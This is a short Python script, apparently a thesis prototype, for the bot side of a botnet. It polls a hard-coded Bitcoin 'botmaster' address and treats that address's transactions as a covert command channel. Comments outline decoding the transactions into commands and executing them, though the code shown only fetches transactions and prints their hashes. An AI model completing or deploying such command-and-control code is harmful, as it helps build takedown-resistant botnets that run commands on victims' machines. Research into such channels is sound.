#!/usr/bin/python3
import time
from hashData import hashData
from blockchain import blockexplorer
# maybe try with websockets later on // https://www.blockchain.com/api/api_websocket
# my wallet actual address
botmasterAddress = '1GgH68gphSF1JHASKa7goET23sHwPqLJFD'
# a test address
botmasterAddress = '3Nzz16cQdmKDmPkNtsjpUP5uqCwg4i4wN7'
keyForSubliminalDecryption = ''

# get the list of Bot master trxs
EncodedTransactionsList = blockexplorer.get_address(
    botmasterAddress).transactions
transactionsFromMaster = len(EncodedTransactionsList)
print("1st -- transactionsFromMaster -- : ", transactionsFromMaster)
DecodedTransactionsList = []

# this command returns the first transaction as shown in the website
# print("block is --> ",  address.transactions[0])
# inputs is an array of people who contributed in this trx
# outputs is an array of people who received money from this trx
# print("block is --> ",  address.transactions[0].inputs[0].address)
# print("block is --> ", EncodedTransactionsList[0].hash)

# for the thesis we may need to check only unconfirmed trxs of botmaster

# 1. try getting new transactions generated by the bot master
# 2. store them in a list
# 3. try decoding them (
#   if success :
#       it means this is the last transaction from the master,
#       so decode the previous ones
#       store them in another list
#       and empty list of trxs, to start over again
#   else :
#       store this trx in the list
# )
# 4.    if list of decoded ones is not empty, execute them in order
#       else loop again and wait for next command
# 5. Finish
string = "ls -la"
hashData(string)

while True:
    currentTrxs = blockexplorer.get_address(botmasterAddress).n_tx
    if currentTrxs > 50:
        currentTrxs = 50
    print("----------------> currentTrxs ..", currentTrxs)
    if currentTrxs < transactionsFromMaster:
        print("error------->")
        break
    elif currentTrxs == transactionsFromMaster:
        print("----------------equal so sleep----------------")
        time.sleep(60)
        continue
    else:
        EncodedTransactionsList = blockexplorer.get_address(
            botmasterAddress).transactions
        transactionsFromMaster = len(EncodedTransactionsList)
        print("More transactions --> transactionsFromMaster : ", transactionsFromMaster)

    i = 0
    for TRXobject in EncodedTransactionsList:
        print("hash of obj", i, " is : ", TRXobject.hash)
        i += 1
